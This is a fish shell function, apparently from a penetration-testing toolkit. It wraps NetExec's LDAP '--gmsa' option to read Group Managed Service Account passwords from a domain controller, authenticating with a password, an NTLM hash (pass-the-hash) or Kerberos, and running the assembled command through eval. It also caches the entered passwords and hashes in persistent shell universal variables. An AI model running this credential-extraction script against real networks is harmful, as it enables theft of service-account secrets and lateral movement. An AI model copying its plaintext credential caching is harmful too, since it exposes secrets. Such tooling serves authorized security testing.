# description: Read GMSA passwords using nxc ldap
function __kronos_gmsa --description "Read GMSA passwords using nxc ldap"
    argparse t/target= h/help q/quiet u/username= p/password= H/hash= k/kerberos X/edit-cmd w/wizard -- $argv
    or return 1

    if set -q _flag_help
        echo "Usage: kronos gmsa [OPTIONS]"
        echo ""
        echo "Read GMSA passwords using nxc ldap."
        echo ""
        echo "Options:"
        echo "  -t, --target IP     Target DC IP or Hostname"
        echo "  -u, --username USER Auth username"
        echo "  -p, --password PASS Auth password"
        echo "  -H, --hash HASH     Auth NTLM hash"
        echo "  -k, --kerberos      Use Kerberos authentication"
        echo "  -X, --edit-cmd      Inspect and edit the command before execution"
        echo "  -q, --quiet         Skip prompts and use fallbacks"
        echo "  -h, --help          Show this help message"
        return 0
    end

    set -l target $_flag_target
    if test -z "$target"; set target $argv[1]; end
    set -l auth_user $_flag_username
    set -l auth_pass $_flag_password
    set -l auth_hash $_flag_hash

    if not set -q _flag_quiet
        if test "$wizard" -eq 1 -o -z "$target"; or set -q _flag_wizard
            set_color cyan; echo "[*] Starting GMSA wizard..."; set_color normal

            set -l def_target "$__KRONOS_CACHE_GMSA_TARGET"
            set -l src_target "Cache"
            if test -z "$def_target"
                set def_target "$TGT"; set src_target "TGT"
                if test -z "$def_target"; set def_target "$TGT_DC_IP"; set src_target "TGT_DC_IP"; end
                if test -z "$def_target"; set def_target "$TGT_DC"; set src_target "TGT_DC"; end
                if test -z "$def_target"; set def_target "$TGT_HOSTS[1]"; set src_target "TGT_HOSTS"; end
            end
            if test -n "$target"; set def_target "$target"; set src_target "CLI Arg"; end
            set target (__kronos_ask "Target DC IP/Hostname" "$def_target" "$src_target"); or return 1
            set -U __KRONOS_CACHE_GMSA_TARGET "$target"

            if not set -q _flag_kerberos
                set -l def_auth_user "$__KRONOS_CACHE_GMSA_AUTH_USER"
                set -l src_user "Cache"
                if test -z "$def_auth_user"
                    set def_auth_user "$TGT_USERNAME"; set src_user "TGT_USERNAME"
                    if test -z "$def_auth_user"; set def_auth_user "$TGT_CRED_USERNAME"; set src_user "TGT_CRED_USERNAME"; end
                end
                if test -n "$auth_user"; set def_auth_user "$auth_user"; set src_user "CLI Arg"; end
                set auth_user (__kronos_ask "Auth Username" "$def_auth_user" "$src_user"); or return 1
                set -U __KRONOS_CACHE_GMSA_AUTH_USER "$auth_user"

                set -l def_auth_val "$auth_pass"
                if test -n "$auth_hash"; set def_auth_val "$auth_hash"; end
                if test -z "$def_auth_val"; set def_auth_val "$TGT_PASSWORD"; end
                set -l auth_input (__kronos_ask "Auth Password or Hash" "$def_auth_val"); or return 1
                set -U __KRONOS_CACHE_GMSA_AUTH_VAL "$auth_input"
                
                if string match -rq '^[a-fA-F0-9]{32}:[a-fA-F0-9]{32}$|^[a-fA-F0-9]{32}$' -- "$auth_input"
                    set auth_hash "$auth_input"; set auth_pass ""
                else
                    set auth_pass "$auth_input"; set auth_hash ""
                end
            end
        end
    else
        # Quiet mode fallbacks
        if test -z "$target"; set target "$__KRONOS_CACHE_GMSA_TARGET"; end
        if test -z "$target"; set target $TGT_HOSTS[1]; end
        if test -z "$target"; set target $TGT_DC_IP; end

        if test -z "$auth_user"
            set auth_user "$TGT_USERNAME"
            if test -z "$auth_user"; set auth_user "$TGT_CRED_USERNAME"; end
        end
        if test -z "$auth_pass"; and test -z "$auth_hash"
            set auth_pass "$TGT_PASSWORD"
            if test -z "$auth_pass"; set auth_pass "$TGT_CRED_PASSWORD"; end
        end
    end

    if test -z "$target"; echo "error: target is required" >&2; return 1; end

    set -l nxc_cmd "nxc ldap $target"
    if test -n "$TGT_DC_DOMAIN"; set nxc_cmd "$nxc_cmd -d $TGT_DC_DOMAIN"; end

    if set -q _flag_kerberos
        set nxc_cmd "$nxc_cmd -k -u \"$auth_user\" -p ''"
    else
        if test -z "$auth_user"
            echo "error: credentials required"; return 1
        end
        set nxc_cmd "$nxc_cmd -u \"$auth_user\""
        if test -n "$auth_hash"
            set nxc_cmd "$nxc_cmd -H \"$auth_hash\""
        else
            set nxc_cmd "$nxc_cmd -p \"$auth_pass\""
        end
    end

    set nxc_cmd "$nxc_cmd --gmsa"

    if set -q _flag_edit_cmd
        set nxc_cmd (__kronos_edit_cmd "$nxc_cmd"); or return 1
    end

    __kronos_check_dep nxc; or return 1

    echo "[*] Reading GMSA passwords via nxc ldap..."
    eval $nxc_cmd
end
